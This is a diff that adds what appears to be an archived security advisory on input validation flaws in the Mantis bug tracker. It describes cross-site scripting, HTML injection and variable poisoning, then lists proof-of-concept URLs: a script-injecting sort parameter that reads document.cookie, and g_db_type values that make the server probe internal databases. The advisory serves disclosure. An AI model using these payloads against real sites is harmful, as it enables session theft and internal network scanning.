@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/14604/info
+
+Mantis is prone to multiple input validation vulnerabilities. These issues involve cross-site scripting, HTML injection and variable poisoning, and are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage the cross-site scripting issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.
+
+Successful exploitation of the HTML injection issue could result in having attacker-supplied HTML and script code executed in the context of the affected Web site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.
+
+The variable poisoning issue could result in unauthorized access and denial of service attacks. 
+
+A - Cross Site Scripting Vulnerabilities
+
+http://www.example.com/view_all_set.php?sort=severity&dir="><script>alert(document.cookie)</script>&type=2
+
+B.- Database scanner via variable poisoning
+
+http://www.example.com/core/database_api.php?g_db_type=mysql://invaliduser@localhost:3336
+http://www.example.com/core/database_api.php?g_db_type=mysql://root@localhost:3336
+http://www.example.com/core/database_api.php?g_db_type=informix://localhost:8080
+http://www.example.com/core/database_api.php?g_db_type=mysql://root@10.x.y.z 
